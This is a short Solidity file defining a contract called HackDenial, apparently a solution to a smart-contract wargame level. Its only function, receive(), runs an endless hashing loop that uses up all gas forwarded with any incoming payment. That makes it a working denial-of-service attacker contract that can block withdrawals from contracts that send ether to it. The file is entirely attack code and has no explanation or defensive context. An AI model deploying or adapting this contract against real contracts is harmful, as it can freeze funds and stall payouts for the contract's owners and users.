// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackDenial {
    receive() external payable {
        while (true) {
            keccak256("hello");
        }
    }
}
